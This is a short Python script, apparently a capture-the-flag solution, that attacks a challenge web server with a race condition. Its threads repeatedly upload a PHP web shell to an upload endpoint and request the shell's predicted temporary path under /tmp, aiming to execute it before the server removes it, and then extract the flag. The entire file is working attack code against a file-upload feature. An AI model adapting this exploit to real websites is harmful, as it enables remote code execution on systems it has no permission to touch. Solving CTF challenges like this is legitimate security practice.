import httpx
import datetime
import threading
import os
import re

URL = 'https://5ff5201cf17538a49389c48c.deadsec.quest'
max_threads = 50

class BaseAPI:
    def __init__(self, url=URL):
        self.c = httpx.Client(base_url=url)

    def access_file(self, timestamp):
        file_name = f'/tmp/shell_{int(timestamp)}.php'
        response = self.c.get(file_name)
        res = response.text
        flag = re.findall(r"DEAD{.*}", res)
        if flag:
            print(f'here\'s ur flag {flag}')
            os.kill(os.getpid(), 9)

    def upload(self):
        with open('shell.php', 'rb') as file:
            files = {'files': ('shell.php', file, 'application/x-php')}
            response = self.c.post('/upload.php', files=files)

if __name__ == "__main__":
    api = BaseAPI()

    for i in range(50000):
        current_timestamp = int(datetime.datetime.now().timestamp())
        t1 = threading.Thread(target=api.access_file, args=(current_timestamp,))
        t2 = threading.Thread(target=api.upload)
        t1.start()
        t2.start()
        if threading.active_count() > max_threads:
            t1.join()
            t2.join()
            print('max_threads reached')